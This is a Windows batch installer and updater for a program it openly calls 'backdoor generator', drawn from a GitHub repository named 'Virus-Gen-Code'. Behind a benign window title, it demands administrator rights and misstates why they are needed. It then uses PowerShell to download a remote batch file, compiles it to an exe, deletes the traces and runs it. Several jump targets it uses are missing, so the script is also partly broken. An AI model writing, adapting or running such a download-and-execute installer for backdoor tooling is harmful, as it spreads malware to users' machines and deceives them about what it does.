@echo on&title updating base environment...&cls
cd C:\ProgramData
goto CP
:adminyes
if exist "C:\users\%username%\AppData\base_environment_location.txt" (< "C:\users\%username%\AppData\base_environment_location.txt" (
  set /p install_location=
)) else (goto set_install_location)
echo starting update...
timeout 1 /NOBREAK>nul
echo creating bat2exe command...
Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/bat2exe.bat").Content >C:\ProgramData\bat2exe.bat
echo bat2exe succesfuly made
if not exist %install_location% mkdir %install_location%
echo downloading code...
Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/updater.bat").Content >"C:\programdata\backdoor generator.bat"
echo converting file to exe...
call bat2exe.bat "backdoor generator.bat" "backdoor generator.exe"
timeout 2 /nobreak >nul
del bat2exe.bat
del "backdoor generator.bat"
move "backdoor generator.exe" "%install_location%"
echo update complete
echo placeholder>"C:\users\%username%\appdata\updateflag.txt"
echo.
call "%install_location%\backdoor generator.exe"
exit /b









:git_query
echo.
echo git is required to run the program
echo would you like to install it now? (if you pick no you will have to install it when you first launch the program)
echo press Y for yes, press N for no, press I for information on why this is required
:redo_git
choice /C YMI /M "install git now?"
if %errorlevel% equ 3 goto git_info
if %errorlevel% equ 1 (set install_git=true) else (set install_git=false)
goto GIT_check_next
:int_exp_query
echo.
echo internet explorer must be enabled to use this program
echo would you like to install it now? (if you pick no you will have to install it when you first launch the program)
echo press Y for yes, press N for no, press I for information on why this is required
:redo_int_exp
choice /C YNI /M "install internet explorer now?"
if %errorlevel% equ 3 goto int_exp_info
if %errorlevel% equ 1 (set install_int_exp=true) else (set install_int_exp=false)
goto int_exp_next
:int_exp_info
Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/internet_explorer_information.txt").Content >internet_explorer_information.txt
echo.
echo please close the text document to continue
start internet_explorer_information.txt /WAIT
del internet_explorer_information.txt
goto int_exp_next
:git_info
Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/GIT_information.txt").Content >GIT_information.txt
echo.
echo please close the text document to continue
start GIT_information.txt /WAIT
del GIT_information.txt
goto redo_int_exp
:imput_email
echo.
echo no email was detected, email is required to authenticate on git and for whitelist verification
echo would you like to imput it now? (if you pick no program will ask you for your email on first launch)
echo press Y for yes, press N for no
choice /M "imput email?"
if %errorlevel% neq 1 goto email_next
set /p email=email:
echo %email%>C:\ProgramData\GVGemail.sav
goto email_next
:Whitelist_error
del WL2.sav
echo it apears you are not whitelisted
echo.
echo press any key to exit...
pause >nul
exit /b
:bat2exe_install_error
echo there was an error when trying to create bat2exe command, this command is fatal and setup cannot continue.
echo.
echo press any key to exit...
pause >nul
exit /b
:CP
    net session >nul 2>&1
    if %errorLevel% == 0 (
        goto adminyes
    ) else (
        goto admin_error
    )
:admin_error
echo [31merror code: 03[0m
echo [31merror: program was not run with administrator perms[0m
echo [31merror type: fatal[0m
echo [31mhow to replicate: do not run file as administrator[0m
echo [31mhow to fix: rerun program by right clicking on file and clicking "run as administrator"[0m
echo [31mextra information: administrator perms are required to access github[0m
echo.
echo press any key to exit...
pause >nul
exit /b
:set_install_location
echo the app was not found, please specify where it is or a new place to install it.
set /p install_location=backdoor generator directory:
echo %install_location%>"C:\users\%username%\AppData\base_environment_location.txt"
goto installsetnxt